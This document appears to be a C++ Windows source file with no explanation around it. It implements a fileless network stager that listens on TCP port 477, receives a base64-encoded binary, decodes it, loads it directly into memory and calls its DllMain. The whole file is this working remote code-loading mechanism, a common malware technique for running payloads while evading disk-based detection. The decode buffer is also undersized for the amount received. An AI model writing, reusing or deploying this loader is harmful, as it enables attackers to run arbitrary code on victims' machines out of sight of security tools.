#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <Windows.h>
#include "base64.h"
#include "MemoryLoadDll.h"
#pragma comment(lib, "ws2_32.lib")


int main()
{
	LPWSADATA wsaData = new WSAData();
	SOCKET listenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	INT RecvBytes = 0;
	PCSTR port = "477";
	ADDRINFOA* SocketHint = new ADDRINFOA();
	ADDRINFOA* AddrInfo = new ADDRINFOA();

	SocketHint->ai_family = AF_INET;
	SocketHint->ai_socktype = SOCK_STREAM;
	SocketHint->ai_protocol = IPPROTO_TCP;
	SocketHint->ai_flags = AI_PASSIVE;

	WSAStartup(MAKEWORD(2, 2), wsaData);
	GetAddrInfoA(NULL, port, SocketHint, &AddrInfo);

	listenSocket = socket(AddrInfo->ai_family, AddrInfo->ai_socktype, AddrInfo->ai_protocol);
	bind(listenSocket, AddrInfo->ai_addr, AddrInfo->ai_addrlen);
	listen(listenSocket, SOMAXCONN);

	ClientSocket = accept(listenSocket, NULL, NULL);

	char* bufferReceivedBytes = new char[10000];
	char* DecodeBytes = new char[5120];
	RecvBytes = recv(ClientSocket, bufferReceivedBytes, 10000, NULL);
	
	INT dwFileSize = 0;
	//接收base64编码后的exe
	dwFileSize = b64_decode((unsigned char*)bufferReceivedBytes, RecvBytes, (unsigned char *)DecodeBytes);
	//解码exe写入DecodeBytes

	LPVOID lpBaseAddress = MmLoadLibrary(DecodeBytes, dwFileSize);

	typedef BOOL(*typedef_dllmain)(void);
	typedef_dllmain dllmain = (typedef_dllmain)MmGetProcAddress(lpBaseAddress, (PCHAR)"DllMain");
	dllmain();
	

	return 0;
}